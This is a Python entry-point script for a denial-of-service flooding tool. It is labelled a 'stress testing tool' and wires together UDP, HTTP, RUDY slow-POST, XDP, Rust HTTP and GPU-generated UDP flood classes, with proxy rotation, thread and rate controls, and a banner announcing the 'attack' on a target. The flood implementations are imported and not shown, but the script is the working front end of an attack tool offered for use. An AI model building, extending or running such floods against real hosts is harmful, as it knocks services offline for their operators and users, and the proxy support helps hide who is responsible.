#!/usr/bin/env python3
import argparse
import json
import sys
import time

from attacks import UDPFlood, HTTPFlood, RUDY, HTTPAsyncFlood, XdpUdpFlood, RustHttpFlood, GpuUdpFlood
from core.proxy import ProxyManager
from core.stats import StatsMonitor

METHODS = {
    "udp": UDPFlood,
    "http": HTTPFlood,
    "rudy": RUDY,
    "http-async": HTTPAsyncFlood,
    "xdp": XdpUdpFlood,
    "http-rust": RustHttpFlood,
    "gpu": GpuUdpFlood,          # <-- add this
}

def main():
    parser = argparse.ArgumentParser(description="Advanced stress testing tool")
    parser.add_argument("--method", required=True, choices=METHODS.keys())
    parser.add_argument("--target", required=True)
    parser.add_argument("--port", type=int, default=80)
    parser.add_argument("--threads", type=int, default=32)
    parser.add_argument("--duration", type=int, default=60)
    parser.add_argument("--rps", type=int, default=0, help="Rate limit (requests/sec)")
    parser.add_argument("--proxy-file", help="File with proxies (one per line)")
    parser.add_argument("--json", action="store_true", help="Output stats as JSON")
    parser.add_argument("--payload-size", type=int, default=1024, help="UDP payload size")
    parser.add_argument("--path", default="/", help="HTTP path")
    parser.add_argument("--interface", default="eth0", help="Network interface for XDP attack")
    parser.add_argument("--concurrency", type=int, default=1000, help="Concurrent connections for Rust HTTP flood")
    parser.add_argument("--disable-pooling", action="store_true", help="Disable HTTP connection pooling")
    parser.add_argument("--num-packets", type=int, default=2_000_000, help="Number of packets to pre-generate on GPU")
    parser.add_argument("--send-threads", type=int, default=8, help="Number of threads for GPU UDP sending")

    args = parser.parse_args()

    # Setup proxy manager if file provided
    pm = None
    if args.proxy_file:
        pm = ProxyManager(args.proxy_file)
        print(f"[*] Loaded {len(pm.proxies)} proxies")

    # Base arguments for all attacks
    attack_kwargs = {
        "target": args.target,
        "port": args.port,
        "threads": args.threads,
        "duration": args.duration,
        "rps": args.rps,
    }

    # Add method-specific arguments
    if args.method in ("udp", "http", "rudy", "http-async"):
        attack_kwargs.update({
            "proxy_manager": pm,
            "payload_size": args.payload_size,
            "path": args.path,
        })

    if args.method == "xdp":
        attack_kwargs["interface"] = args.interface

    if args.method == "http-rust":
        attack_kwargs.update({
            "concurrency": args.concurrency,
            "disable_pooling": args.disable_pooling,
        })
    if args.method == "gpu":
      attack_kwargs.update({
            "num_packets": args.num_packets,
            "send_threads": args.send_threads,
    })

    # Instantiate the selected attack
    attack_class = METHODS[args.method]
    attack = attack_class(**attack_kwargs)

    # Start stats monitor
    monitor = StatsMonitor(attack, interval=1.0, json_output=args.json)
    monitor.start()

    print(f"[*] Starting {args.method.upper()} attack on {args.target}:{args.port}")
    stats = attack.start()

    # Print final summary
    if args.json:
        print(json.dumps(stats))
    else:
        elapsed = stats["end_time"] - stats["start_time"]
        avg_pps = stats['requests'] / elapsed if stats['requests'] > 0 and elapsed > 0 else 0.0
        print(f"\n[✓] Done. Total requests: {stats['requests']} | "
              f"Elapsed: {elapsed:.1f}s | "
              f"Avg PPS: {avg_pps:.1f} | "
              f"Errors: {stats['errors']}")

if __name__ == "__main__":
    main()